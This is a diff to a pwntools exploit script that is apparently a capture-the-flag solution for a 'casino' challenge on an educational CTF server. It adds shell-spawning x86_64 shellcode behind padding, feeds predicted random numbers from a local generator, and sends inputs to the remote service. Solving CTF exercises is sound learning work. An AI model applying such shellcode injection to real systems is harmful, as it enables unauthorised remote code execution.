@@ -1,11 +1,18 @@
 from pwn import *
 
+# shellcode
+context.clear(arch='x86_64')
+# sc = pwnlib.encoders.encoder.encode(asm(shellcraft.sh()))
+sc = asm(shellcraft.sh())
+name_all = b'A' * 0x10 + sc
+
+# r = process("./casino")
+# random number
 p = process("./gen_num.out")
-#r = process("./casino")
-# random number part
-numbers = p.recvall().split('\n')
+numbers = p.recvall().decode().split('\n') # prevent bytes object is required not str error
 del numbers[-1]
 p.close()
+
 
 # send
 r = remote('edu-ctf.csie.org', 10172)
@@ -25,4 +32,5 @@ for cnt_try in range(0, 2):
     r.sendline('0')
     print(r.recvline())
 
+#r.interactive()
 r.close()
